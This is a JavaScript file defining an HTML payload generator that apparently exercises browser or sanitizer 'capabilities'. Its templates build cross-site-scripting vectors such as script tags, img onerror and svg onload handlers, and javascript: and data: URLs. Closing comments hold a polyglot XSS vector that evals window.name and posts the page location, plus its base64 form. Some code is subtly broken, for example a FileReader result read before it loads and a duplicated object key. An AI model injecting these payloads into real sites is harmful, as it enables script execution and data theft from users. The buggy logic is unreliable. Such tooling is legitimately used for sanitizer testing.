var Producer = (function() {
  var producer = {};

  var mediaCache = {};

  var tagTemplates = {
    /* a dictionary of "capability" names and examples to exercise them.
     to exercise a cap we require a html construct of the following form:
     tagName: of course, the name of the html tag
     attributes: a dict of key/value pairs
     content: content between the opening and the closing tag.

     filling attribute values or content can be done by giving a pair of typeExample and an optional type (not required)
     in the form as a array with the length of two.
     content-types can be either type/subtype or just type (e.g. "image" or "image/gif", but not "image/*").

     */
    'CAP_INCLUDE_PAGE': [{'tagName': 'iframe', 'attributes': {'src': ['X-url', '']} } ], // the most powerful you can get...descending from here
    'CAP_EXECUTE_SCRIPT': [
      {'tagName': 'script', 'attributes': {}, 'content': ['X-payload', 'text/javascript']},
      {'tagName': 'script', 'attributes': {'src': ['X-url', 'text/javascript']} },
      {'tagName': 'img', 'attributes': {'src': ['X-url', 'image'], 'onload': ['X-payload', 'text/javascript']} },
      {'tagName': 'img', 'attributes': {'src': 'x', 'onerror': ['X-payload', 'text/javascript']} },
      {"tagName": "frameset", "attributes": {'onload': ['X-payload', 'text/javascript'] } },
      {"tagName": "input", "attributes": {"autofocus": "", "onfocus": ['X-payload', 'text/javascript']}}, //TODO doesnt work in frames :/
      {"tagName": "svg", "attributes": {"onload": ['X-payload', 'text/javascript']}},
      {"tagName": "table", "attributes": {"background": ['X-url', 'text/javascript']}},
      {"tagName": "A", "attributes": {"folder": ['X-url', 'text/javascript'],"style": "behavior:url(#default#AnchorClick);"}, "content": ['X-payload','text']},
      {"tagName": "object", "attributes": {"data":['X-url', 'text/javascript']}},
      {"tagName": "embed", "attributes": {"src":['X-url', 'text/javascript']} },
      /*TODO
       replacing in attribute value :<
       {"tagName":"A","attributes":{"style":"-o-link:'javascript:alert(1)';-o-link-source:current"},"content":"X"},
       {"tagName":"STYLE","attributes":{},"content":"@import \"data:,*%7bx:expression(write(1))%7D\";"},
       */
    ],
    //TODO how to nest tags? e.g. <form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>

    'CAP_APPLY_STYLE': [{'tagName': 'span', 'attributes': {'style': ['X-payload', 'text/css'] } },
      {'tagName': 'style', 'attributes': {'type': 'text/css'}, 'content': ['X-payload', 'text/css'] },
      {'tagName': 'style', 'attributes': {'type': 'text/css', 'src': ['X-url', 'text/css']} }
    ],
    'CAP_MEDIA_IMAGE': [{'tagName': 'img', 'attributes': {'src': ['X-url', 'image']} } ],
    'CAP_MEDIA_AUDIO': [{'tagName': 'audio', 'attributes': {'autoplay': 'true', 'src': ['X-url', 'audio']} } ],
    'CAP_MEDIA_VIDEO': [{'tagName': 'video', 'attributes': {'autoplay': 'true', 'src': ['X-url', 'video']} } ],
    'CAP_SHOW_PAGE': [{'tagName': 'iframe', 'attributes': {'src': ['X-url', ''], 'sandbox': ''} } ],
    'CAP_TRIGGER_REQUEST': [
      {'tagName': 'link', 'attributes': {'rel':'prefetch', 'href': ['X-url', '']}, 'content':''} // prefetching
    ],
    'CAP_TRIGGER_DNS': [
      {'tagName': 'link', 'attributes': {'rel':'dns-prefetch', 'href': ['X-url', '']}, 'content':''} // dns-prefetching
    ],
    //TODO this cap requires our x-url/x-payload resolution function to replace the tag but not the whole attribute/content
    //'CAP_CHANGE_PAGE': [
    //  {'tagName': 'meta', 'attributes': {'http-requiv': 'refresh', 'content': '0; url=X-url'}}
    //]

    //XXX how do I (logically) get fonts in here? they are a subset of styles... :/
    // example: @font-face { font-family: Brankovic;     src: url('samples/brankovic.ttf');
    // several formats (ttf, woff, eot !?) , see e.g. http://fonts.googleapis.com/css?family=Londrina+Shadow
  }
  /* most other capabilities are somewhere in-between, since this is really hard to state fine-grained, I might not
   * be able to express this as a POSET :(
   * (see https://en.wikipedia.org/wiki/Partially_ordered_set)
   */
  tagTemplates['MAX'] = tagTemplates['CAP_INCLUDE_PAGE'];


  function typeToPath(resType) {
    // Category: payload (real content) or a url.
    // Type: content-type, either type/subtype or just type, not "type/*".
    var res = {
      'text/html': 'samples/sample.html',
      'text/html': 'samples/sample.txt',
      'text/javascript': 'samples/sample.js',
      'text/css': 'samples/sample.css',
      'application/font-woff': 'samples/brankovic.ttf',
      // images
      'image/svg+xml': 'samples/sample.svg',
      'image/gif':'samples/sample.gif',
      'image/jpeg': 'samples/samples.jpg', // ??
      'image/jpg': 'samples/samples.jpg',
      'image/png': 'samples/sample.png',
      'video/mp4': 'samples/sample.mp4',
      'video/ogg': 'samples/sample.ogv',
      'audio/mpeg': 'samples/sample.mp3',
      'audio/ogg': 'samples/sample.ogg',
      // more to follow... :)
      /* suggestions:
       application/xml, jar (application/x-compressed,application/java-archivemime-type)
       */
    };
    if (resType == '') {
      // most capable or random? :/
      return res[choice(Object.keys(res))]; //res['text/html'];
    }
    if (resType.indexOf("/") == -1) { // have to search through keys... most capable or random? tricky :<
      var list = []
      for (var key in res) {
        var majorType = key.split("/")[0];
        if (majorType.indexOf(resType) == 0) {
          list.push(res[key]);
        }
      }
      return choice(list); // random.
    }
    else if (resType in res) { return res[resType]; }
    else { throw new Error("There was no resource found to satisfy this content type:" + resType); }
  }



  /* XXXXXXXXXXXXXXXXXXX

   // for attributes that require a piece of text:,
   res['attribute-payload'] = {
   'text/javascript': 'alert(1)',
   // this has to be something we can monitor, so url() should make us see the request
   'text/css': "box-shadow: 0 0 20px black, 20px 15px 30px yellow, -20px 15px 30px lime, -20px -15px 30px blue, 20px -15px 30px red; " +
   "background-image: url(" + typeExamples[attribute-url['image/gif']] + " );",
   }

   * */

  function makeURL(contenttype) {
    URL_LAYERS = {
      /**
       * functions(url,type,resolve):
       * url = string of the url,
       * type = content-type string like "text/html",
       * resolve = a method that allows the content of the url to be fetched (data urls require the content to be there, not pointed at :)),
       */
      'javascript': function(path, type) {
        // falling back to HTTP if type is not text/js
        if (type !== 'text/javascript') {
          // we just call our caller again to find a nother protocol
          // this might loop a few times, if the gods of randomness are not with us.
          return makeURL(type);
        }
        var blob = makePayloadAsBlob(path);
        var reader = new FileReader();
        var jsString;
        reader.onload = function(e) { jsString = e.target.result; };
        reader.readAsText(blob);

        return 'javascript:' + jsString;
      },
      /* 'data:': function(path, type) {
       //TODO: think about how to make this fall-back to b64 if binary data are there...
       return 'data:' +type+ ',' + makePayloadAsBlob(path);
       }, */
      'data-base64': function(path, type) { return 'data:' +type+ ';base64,' + btoa(makePayloadAsBlob(path));  },
      'http': function(path, type) { return 'http://' + CONFIG.host + '/' + CONFIG.path + '/' + path;  },
      // TODO add https
    }
    URL_LAYERS['feed'] =  function(path, type) { return 'feed:' + URL_LAYERS['http'](path); };
    URL_LAYERS['pcast'] = function(path, type) { return 'pcast:' + URL_LAYERS['http'](path); },
      URL_LAYERS['view-source'] = function(path, type) { return 'view-source:' + URL_LAYERS['http'](path);  } ;

    var path = typeToPath(contenttype)

    //TODO revisit randomly chosen urls
    //return URL_LAYERS['http'](path, contenttype);
    return URL_LAYERS[choice(Object.keys(URL_LAYERS))](path, contenttype);
  }
  function makePayloadAsBlob(path) {
    if (path in mediaCache) {
      return mediaCache[path];
    }
    if (typeof require !== "undefined") {
      var fs = require("fs");
      var content = fs.readFileSync(path);
      mediaCache[path] = content;
      return content;
    } else {
      var xhr = new XMLHttpRequest();
      var result;
      xhr.open("GET", path, false); //hackish: synchronous xhr
      xhr.send();
      var content = xhr.response;
      mediaCache[path] = content;
      return new Blob([content]);
    }
  }
  function resolveResource(arr) {
    var resMethod = arr[0];
    var typ = arr[1];
    //console.log("resolving via " + resMethod + '('+typ+')')
    if (resMethod == "X-url") {
      return makeURL(typ)
    }
    else if (resMethod == "X-payload") {
      var path = typeToPath(typ);
      return makePayloadAsBlob(path);
    }
  }

  function choice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
  }

  function templateToHTML(tmplObj) {
    //console.log("Generating " + tmplObj['tagName'] + " tag.");


    var tag = '<' + tmplObj['tagName'];
    for (var att in tmplObj['attributes']) {
      var attVal = tmplObj['attributes'][att];
      if (typeof attVal != "string") {         // resolve X-url, X-payload directive
        attVal = resolveResource(attVal);

      }
      tag += ' '+ att + '="' + attVal + '"'; // concat with something like  src="srcVal"
    }
    tag += '>';
    if ('content' in tmplObj) {
      if (typeof tmplObj['content'] != "string") {
        tmplObj['content'] = resolveResource(tmplObj['content']);
      }

      tag += tmplObj['content'];
    }
    //TODO do not add ending for img, br,
    tag += '</' + tmplObj['tagName'] +'>'
    return tag;

  }



  function exerciseCapability(cap) {
    if (!(cap in tagTemplates)) {
      throw new Error("Capability is not defined")
    }
    var capCode = choice(tagTemplates[cap]); // randomly pick one
    return templateToHTML(capCode);
  }

  var tested = {};
  function exerciseNewCapability(cap) {
    var newVector;
    var tries = 0;
    do {
      newVector = exerciseCapability(cap);
      tries++;
      if (tries > 50) { console.log("I failed to make a new vector. I tried a lot. Quitting."); throw new Error(); }
    } while (newVector in tested);
    tested[newVector] = true;
    return newVector;
  }



  producer.exerciseCapability = exerciseCapability;
  producer.exerciseNewCapability = exerciseNewCapability;
  return producer;
})();
// cool vector I just thought of: -->"; alert("<script>alert(1)</script>");//
// works in comment, script and pure html. not in any tag or style though.
// see also "one vector to rule them all".
//     reworked the "one vector" to use our top.postMessage thing :)
// javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=top.postMessage([window.location.href,window.name],/\*/.source.slice(1))]<img -/style=a:expression&#40&#47&#42'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=top.postMessage([window.location.href,window.name],/\*/.source.slice(1)) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"
// == atob("amF2YXNjcmlwdDovKi0tPl1dPiU+Pz48L3NjcmlwdD48L3RpdGxlPjwvdGV4dGFyZWE+PC9ub3NjcmlwdD48L3N0eWxlPjwveG1wPiI+W2ltZz0xLG5hbWU9dG9wLnBvc3RNZXNzYWdlKFt3aW5kb3cubG9jYXRpb24uaHJlZix3aW5kb3cubmFtZV0sL1wqLy5zb3VyY2Uuc2xpY2UoMSkpXTxpbWcgLS9zdHlsZT1hOmV4cHJlc3Npb24mIzQwJiM0NyYjNDInLy0vKiYjMzksLyoqL2V2YWwobmFtZSkvKiUyQS8vLyovLy8mIzQxOzt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO3Bvc2l0aW9uOmFic29sdXRlOy1tcy1iZWhhdmlvcjp1cmwoI2RlZmF1bHQjdGltZTIpIG5hbWU9dG9wLnBvc3RNZXNzYWdlKFt3aW5kb3cubG9jYXRpb24uaHJlZix3aW5kb3cubmFtZV0sL1wqLy5zb3VyY2Uuc2xpY2UoMSkpIG9uZXJyb3I9ZXZhbChuYW1lKSBzcmM9MSBhdXRvZm9jdXMgb25mb2N1cz1ldmFsKG5hbWUpIG9uY2xpY2s9ZXZhbChuYW1lKSBvbm1vdXNlb3Zlcj1ldmFsKG5hbWUpIG9uYmVnaW49ZXZhbChuYW1lKSBiYWNrZ3JvdW5kPWphdmFzY3JpcHQ6ZXZhbChuYW1lKS8vPiI=");
//
